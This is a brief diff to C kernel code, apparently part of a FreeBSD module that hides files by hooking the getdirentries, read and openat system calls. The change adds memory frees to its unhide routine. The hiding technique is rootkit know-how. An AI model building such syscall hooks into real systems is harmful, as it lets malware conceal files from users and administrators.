@@ -559,6 +559,11 @@ void
 unhide_files(void)
 {
 	hook_set(sys_getdirentries, getdirentries_prepatch);
+	free(getdirentries_prepatch, M_TEMP);
+
 	hook_set(sys_read, read_prepatch);
+	free(read_prepatch, M_TEMP);
+
 	hook_set(sys_openat, openat_prepatch);
+	free(openat_prepatch, M_TEMP);
 }
